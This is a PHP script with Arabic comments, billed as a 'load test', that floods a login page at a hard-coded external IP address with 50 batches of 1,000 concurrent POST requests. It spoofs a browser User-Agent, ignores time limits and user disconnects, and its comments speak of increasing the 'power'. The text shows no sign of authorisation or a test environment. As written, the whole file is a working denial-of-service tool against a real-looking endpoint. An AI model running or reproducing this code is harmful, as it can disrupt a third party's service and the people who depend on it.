<?php
// 1. تفعيل التخزين المؤقت مبدئياً لتفادي تداخل الترويسات (Warnings)
ob_start();

// إلغاء القيود الزمنية تماماً ومنع السكربت من التوقف عند إغلاق الشاشة
set_time_limit(0);
ignore_user_abort(true);

// إرسال الترويسات بشكل نظيف وفي البداية المطلقة
header('Content-Type: text/html; charset=utf-8');
header('X-Accel-Encoding: none'); // إيقاف التخزين المؤقت في سيرفرات Nginx

// الآن نقوم بتفريغ الذاكرة المؤقتة وبدء التدفق المباشر بأمان
if (ob_get_length()) {
    ob_end_clean();
}
echo str_repeat(' ', 1024); // حشو أولي لتنشيط خاصية التدفق (Streaming) في المتصفحات
flush();

// 2. إعداد الرابط والبيانات الذكية المتعددة المسميات لتجاوز مشكلة "رقم الحساب مطلوب"
$target_url = "http://187.7.17.67/sudani/login2.php";

// قمنا هنا بوضع كافة الاحتمالات الممكنة لاسم الحقل لتصل القيمة للسيرفر مهما كان الاسم البرمجي المطلوب
$payload = [
    'account'         => '123456789',
    'account_number'  => '123456789',
    'username'        => '123456789',
    'user'            => '123456789',
    'phone'           => '123456789',
    'phone_number'    => '123456789',
    'number'          => '123456789',
    'login'           => '123456789',
    'password'        => 'test_password'
];

// 3. إعدادات تكثيف الحمل والضغط (تعديل الأرقام لزيادة القوة)
$concurrency_batch = 1000;  // 1000 طلب متزامن في الدفعة الواحدة لزيادة التوازي
$total_batches     = 50;   // عدد الدفعات الإجمالية

echo "<h2>🔥 بدء اختبار الحمل الذكي والمكثف (Multi-Payload + cURL Multi)</h2>";
echo "⚙️ الإعدادات الحالية: إرسال <b>{$concurrency_batch}</b> طلب متزامن محشو بالاحتمالات على مدار <b>{$total_batches}</b> دفعة.<br>";
echo "---------------------------------------------------------------------------------<br><br>";
flush();

// 4. حلقة التكرار الأساسية للمجموعات (The Loop Batches)
for ($batch = 1; $batch <= $total_batches; $batch++) {
    
    echo "📦 <b>تشغيل الدفعة رقم [ {$batch} / {$total_batches} ]</b>... ";
    flush();
    
    // تهيئة المعالج المتعدد للطلب المتوازي
    $mh = curl_multi_init();
    $handles = [];

    // بناء القنوات المتوازية لهذه الدفعة
    for ($i = 0; $i < $concurrency_batch; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $target_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // وقت انتهاء ذكي لتفادي تعليق الدفعة
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Content-Type: application/x-www-form-urlencoded'
        ]);
        
        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;
    }

    // تنفيذ الدفعة وإطلاق كافة طلباتها معاً في نفس اللحظة
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh); 
    } while ($running > 0);

    // فحص الإحصائيات السريعة لهذه الدفعة
    $success_200 = 0;
    $other_codes = 0;

    foreach ($handles as $ch) {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code == 200) {
            $success_200++;
        } else {
            $other_codes++;
        }
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);

    // طباعة النتيجة الفورية للدفعة الحالية قبل الانتقال للدفعة التالية
    echo "📊 النتيجة: (✅ استجابة 200: <b>{$success_200}</b> | ❌ أخرى/قيود: <b>{$other_codes}</b>)<br>";
    flush();

    // فاصل زمني ميكروي لضمان استقرار تدفق البيانات
    usleep(100000); 
}

echo "<br>🏁 <b>انتهت جميع الدفعات المتتالية واكتمل اختبار الحمل الذكي بنجاح.</b>";
flush();
?>
